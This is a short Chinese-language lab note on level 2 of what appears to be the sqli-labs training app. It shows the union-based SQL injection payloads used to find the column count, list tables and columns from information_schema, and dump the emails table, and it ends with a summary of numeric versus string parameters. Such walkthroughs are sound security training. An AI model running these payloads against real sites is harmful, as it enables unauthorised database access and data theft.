# Less-2

## 0x01 注入

?id=1'

![image-20210112170512585](D:\WEB安全\笔记\image\image-20210112170512585.png)

报错型注入，参数类型是数字型。

?id=1 order by 3--+

知道字段数是3，就不再测试了。

?id=-1 union select 1,2,3--+

![image-20210112170745003](D:\WEB安全\笔记\image\image-20210112170745003.png)

?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

![image-20210112170841207](D:\WEB安全\笔记\image\image-20210112170841207.png)

?id=-1 union select 1, group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='emails'#

#和--+效果相同

![image-20210112171026293](D:\WEB安全\笔记\image\image-20210112171026293.png)

?id=-1 union select 1, group_concat(email_id), group_concat(id) from emails--+

![image-20210112171412728](D:\WEB安全\笔记\image\image-20210112171412728.png)

## 0x02 总结

参数类型有两种，一种是数字型，一种是字符型。

参数类型取决于sql语句的写法，看参数在语句中是否被引号包围。